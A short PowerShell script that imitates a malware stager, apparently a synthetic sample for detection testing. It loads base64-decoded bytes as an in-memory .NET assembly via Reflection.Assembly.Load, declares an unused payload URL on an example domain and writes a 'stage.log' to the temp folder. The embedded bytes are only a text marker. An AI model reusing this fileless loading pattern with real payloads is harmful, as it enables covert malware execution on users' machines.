
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://adatum.com/payload.bin',
    [int]$TimeoutSec = 179
)
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjozdjZmMHU1ZDI2')
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $TransferResult = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $TransferResult) {
        Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
